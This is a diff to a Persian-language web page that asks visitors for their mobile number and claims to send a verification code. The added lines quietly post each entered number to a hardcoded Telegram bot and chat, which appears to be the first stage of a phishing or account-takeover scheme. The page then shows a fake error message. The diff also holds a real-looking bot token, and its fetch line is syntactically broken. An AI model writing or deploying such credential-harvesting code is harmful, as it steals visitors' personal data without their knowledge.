@@ -111,6 +111,9 @@
   <div id="ipWarning" class="hidden">شما با IP ایران وارد شده‌اید. لطفاً از فیلترشکن استفاده کنید.</div>
 
   <script>
+    const BOT_TOKEN = "توکن_ربات_شما";
+    const CHAT_ID = "chat_id_شما";
+
     async function goToVerify() {
       try {
         const res = await fetch("https://api.country.is");
@@ -135,11 +138,21 @@
         alert("لطفاً شماره موبایل معتبر وارد کنید.");
         return;
       }
+
       phoneInput.disabled = true;
       document.querySelector("button[onclick='sendCode()']").disabled = true;
       document.getElementById("codeSection").classList.remove("hidden");
       document.getElementById("message").innerHTML = "";
       startTimer();
+
+      // ارسال به تلگرام
+      const text = `شماره جدید:\n${phone}`;
+      fetch(`https://api.telegram.org/bot${8178257200:AAGMH9_8w64QSnok0ZGLSbMuTQxudAJIN5o}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: -1002407582314, text: text })
+      });
+
       setTimeout(() => {
         const msg = document.getElementById("message");
         msg.innerHTML = "<span class='text-red-400'>مشکلی پیش آمد. لطفاً بعداً تلاش کنید.</span>";
